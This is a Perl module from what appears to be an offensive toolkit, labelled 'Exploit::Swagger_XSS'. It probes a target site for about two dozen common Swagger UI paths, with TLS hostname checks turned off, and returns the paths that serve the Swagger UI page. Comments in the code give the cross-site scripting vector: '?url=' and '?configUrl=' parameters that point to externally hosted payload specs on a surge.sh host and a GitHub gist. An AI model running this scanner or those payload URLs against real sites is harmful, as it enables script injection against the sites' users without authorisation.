package Spellbook::Exploit::Swagger_XSS {
    use strict;
    use warnings;
    use LWP::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//) {
                $target = "https://$target";
            }

            $target =~ s/\/$//;

            my $useragent = LWP::UserAgent -> new (ssl_opts => { verify_hostname => 0 });

            my @paths = (
                "/swagger", "/swagger-ui",
                "/swagger.json", "/v2/api-docs", "/api-docs",
                "/api/swagger", "/api/swagger-ui", "/api/swagger.json",
                "/api/v2/api-docs", "/api/api-docs", "/docs/swagger",
                "/docs/swagger-ui", "/docs/swagger.json", "/docs/v2/api-docs", 
                "/docs/api-docs", "/swagger-ui.html", "/api/swagger-ui.html",
                "/api/v1/swagger-ui.html", "/v1/swagger-ui.html",
                "/api/v2/swagger-ui.html", "/v2/swagger-ui.html",
                "/api/v3/swagger-ui.html", "/v3/swagger-ui.html"
            );

            foreach my $path (@paths) {
                my $request = $useragent -> get("$target$path");

                if ($request -> code() == 200) {
                    if ($request -> content() =~ /<title>(.*)<\/title>/) {
                        my $title = $1;

                        if ($title =~ /Swagger UI/) {
                            # ?url=https://jumpy-floor.surge.sh/test.yaml
                            # ?configUrl=https://jumpy-floor.surge.sh/test.json

                            # https://gist.githubusercontent.com/htrgouvea/86e17124610e7550295533e9d7bac571/raw/cf690c6862d38e02a081a9d580510ba8fff28bef/payload-swagger-ui.json
                            # ?configUrl=https://gist.githubusercontent.com/htrgouvea/86e17124610e7550295533e9d7bac571/raw/cf690c6862d38e02a081a9d580510ba8fff28bef/payload-swagger-ui.json
                            
                            push @result, "$target$path\n";
                        }
                    }
                }
            }

            return @result;
        }

        if ($help) {
            return "
                \rExploit::Swagger_XSS
                \r=====================
                \r-h, --help     See this menu
                \r-t, --target   Set a target\n\n";
        }


        return 0;
    }
}

1;